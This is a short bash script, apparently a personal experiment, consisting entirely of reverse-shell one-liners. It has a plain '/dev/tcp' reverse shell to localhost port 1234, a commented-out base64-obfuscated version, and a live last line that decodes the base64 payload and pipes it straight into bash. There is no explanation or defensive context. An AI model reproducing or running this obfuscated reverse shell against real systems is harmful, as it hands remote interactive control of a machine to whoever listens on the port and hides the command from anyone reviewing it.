#!/bin/bash
# date 2023-03-31 23:32:59
# author calllivecn <c-all@qq.com>


#bash -i >&/dev/tcp/localhost/1234 0>&1

#bash -c '{echo,YmFzaCAtaSA+Ji9kZXYvdGNwL2xvY2FsaG9zdC8xMjM0IDA+JjEK}|{base64,-d}|{bash}'
bash -c 'echo YmFzaCAtaSA+Ji9kZXYvdGNwL2xvY2FsaG9zdC8xMjM0IDA+JjEK |base64 -d | bash'

